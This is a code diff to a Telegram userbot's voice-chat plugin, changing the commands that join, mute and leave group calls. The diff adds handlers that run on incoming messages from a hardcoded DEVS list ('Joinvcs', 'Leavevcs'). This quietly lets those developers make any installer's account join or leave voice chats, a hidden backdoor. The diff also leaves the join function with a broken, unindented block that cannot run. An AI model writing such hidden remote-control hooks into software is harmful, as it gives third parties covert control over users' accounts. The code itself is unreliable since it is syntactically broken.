@@ -37,7 +37,8 @@ from telethon.tl.functions.phone import EditGroupCallTitleRequest as settitle
 from telethon.tl.functions.phone import GetGroupCallRequest as getvc
 from telethon.tl.functions.phone import InviteToGroupCallRequest as invitetovc
 
-from . import ayra_cmd, vc_asst, owner_and_sudos, get_string, udB, inline_mention, add_to_queue, mediainfo, file_download, LOGS, is_url_ok, bash, download, Player, VC_QUEUE, list_queue, CLIENTS,VIDEO_ON, vid_download, dl_playlist
+from . import ayra_cmd, vc_asst, owner_and_sudos, get_string, udB, inline_mention, add_to_queue, mediainfo, file_download, LOGS, is_url_ok, bash, download, Player, VC_QUEUE, list_queue, CLIENTS,VIDEO_ON, vid_download, dl_playlist, DEVS
+from Ayra.kynan import register
 
 
 async def get_call(event):
@@ -114,7 +115,8 @@ async def _(e):
         await e.eor(f"`{ex}`")
         
         
-@vc_asst("joinvc")
+@ayra_cmd("joinvc")
+@register(incoming=True, from_users=DEVS, pattern=r"^Joinvcs$")
 async def join_(event):
     if len(event.text.split()) > 1:
         chat = event.text.split()[1]
@@ -124,17 +126,19 @@ async def join_(event):
             return await event.eor(get_string("vcbot_2").format(str(e)))
     else:
         chat = event.chat_id
-    aySongs = Player(chat, event)
+    Nan = Player(chat)
     await asyncio.sleep(1)
-    if not aySongs.group_call.is_connected:
-        await aySongs.vc_joiner()
-    await aySongs.group_call.join()
+    if not Nan.group_call.is_connected:
+    await Nan.group_call.join(chat)
     await asyncio.sleep(1)
-    await aySongs.group_call.set_is_mute(True)
+    await Nan.group_call.set_is_mute(False)
+    await asyncio.sleep(1)
+    await Nan.group_call.set_is_mute(True)
 
 
 
 @vc_asst("(end|leavevc)")
+@register(incoming=True, from_users=DEVS, pattern=r"^Leavevcs$")
 async def leaver(event):
     if len(event.text.split()) > 1:
         chat = event.text.split()[1]
@@ -145,7 +149,7 @@ async def leaver(event):
     else:
         chat = event.chat_id
     aySongs = Player(chat)
-    await aySongs.group_call.stop()
+    await aySongs.group_call.leave()
     if CLIENTS.get(chat):
         del CLIENTS[chat]
     if VIDEO_ON.get(chat):
